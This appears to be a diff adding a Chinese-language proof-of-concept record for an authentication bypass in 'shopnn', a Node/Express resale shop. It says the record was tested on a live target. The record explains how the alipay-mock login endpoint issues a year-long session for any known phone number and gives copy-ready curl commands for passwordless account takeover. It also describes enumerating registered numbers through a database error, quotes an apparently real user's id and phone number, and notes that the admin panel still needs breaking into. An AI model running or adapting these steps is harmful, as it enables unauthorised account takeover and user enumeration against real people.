@@ -1,0 +1,28 @@
+# shopnn(example.com) mock 登录认证绕过：alipay-mock 按 phone 无口令接管任意已知手机号账号
+
+- **code**: shopnn-example.com-mock-登录认证绕过-alipay-mock-按-phone-无口令接管任意已知手
+- **kind**: poc
+- **category**: auth-bypass
+- **component**: shopnn (Node/Express 二手电商)
+- **severity**: high
+- **source**: self
+- **verified**: 1
+- **verified_note**: 在 example.com 任务(581) 目标 shopnn(example.com/wotfqu.cn, 203.0.113.50) 实测：POST /api/pub/auth/login/alipay-mock body={"phone":"13800138000","device_fingerprint":"<任意64hex>"} 3 次随机指纹均返回同一既有账号 {"c_user":{"id":395,"display_name":"口袋小张_7KFX"},"merged":true,"expires_in":31536000}；GET /api/pub/auth/me(Bearer) 返回 logged_in=true,c_user.id=395,phone=13800138000，即无口令接管真实账号。device 路径可自造指纹自动开户；phone-mock 对已注册号返回 MySQL Duplicate 错误(可作存在性预言机)。
+- **tags**: auth-bypass,account-takeover,mock-login,node,express,jwt,shopnn
+- **created_at**: 2026-10-16T09:31:09.239Z
+
+## 描述
+
+shopnn 的 mock 登录三兄弟 /api/pub/auth/login/{device,phone-mock,alipay-mock} 无需口令/短信。alipay-mock 的会话按请求体 phone 绑定：对已存在手机号直接签发该账号的 pub_user JWT(merged:true)，指纹仅需任意 [0-9a-f]{16,128}。故凭已知手机号即可无口令接管账号；会话有效期 1 年，example.com 与 wotfqu.cn 共用后端与密钥，token 跨 vhost 通用。phone-mock 的 Duplicate 报错可枚举已注册号码。
+
+## 用法
+
+```
+# 1) 接管已知手机号(无口令)
+curl -sk https://example.com/api/pub/auth/login/alipay-mock -H 'Content-Type: application/json' \
+  -d '{"phone":"<目标手机号>","device_fingerprint":"'$(python -c "import secrets;print(secrets.token_hex(32))")'"}'
+# 返回 data.access_token 即目标账号会话；再 GET /api/pub/auth/me 验证
+curl -sk https://example.com/api/pub/auth/me -H 'Authorization: Bearer <access_token>'
+# 2) 枚举已注册手机号：phone-mock 返回 'Duplicate entry ... uk_phone_mock_phone' 即已注册
+# 3) 限制：pub token 打不了 /api/admin/* (40102)，admin 为独立 Node/Express，需另行突破
+```
